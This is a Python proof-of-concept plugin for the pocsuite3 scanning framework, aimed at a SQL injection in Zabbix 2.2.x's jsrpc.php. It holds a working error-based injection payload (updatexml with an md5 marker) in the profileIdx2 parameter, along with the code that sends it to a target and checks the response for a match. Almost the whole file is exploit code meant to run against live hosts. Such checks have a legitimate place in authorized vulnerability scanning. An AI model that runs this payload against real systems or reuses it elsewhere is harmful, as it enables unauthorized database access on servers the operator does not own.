#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
	vulID = ''''''
	cveID = ''''''
	cnvdID = ''''''
	cnnvdID = ''''''
	version = ''''''
	author = ''''''
	vulDate = ''''''
	createDate = ''''''
	updateDate = ''''''
	name = '''zabbix_jsrpc_sqli'''
	desc = ''''''
	solution = ''''''
	severity = '''high'''
	vulType = '''sql-inj'''
	taskType = '''app-vul'''
	references = ['''''']
	appName = '''Zabbix'''
	appVersion = '''2.2.x'''
	appPowerLink = ''''''
	samples = ['''''']
	install_requires = ['''''']

	def _attack(self):
		return self._verify()

	def _verify(self):
		self.url, ip, port = parse_ip_port(self.target, 80)
		result = {}
		verify_url = make_verify_url(self.url, "/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,md5(0x36),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17", mod=0)
		response = requests.get(verify_url, verify=False, timeout=20)
		if b'c5a880faf6fb5e6087eb1b2dc' in response.content and response.status_code == 200:
			result['VerifyInfo'] = {}
			result['VerifyInfo']['URL'] = response.url
			result['VerifyInfo']['port'] = port
		return self.parse_output(result)

	def parse_output(self, result):
		#parse output
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Failed')
		return output


register_poc(TestPOC)
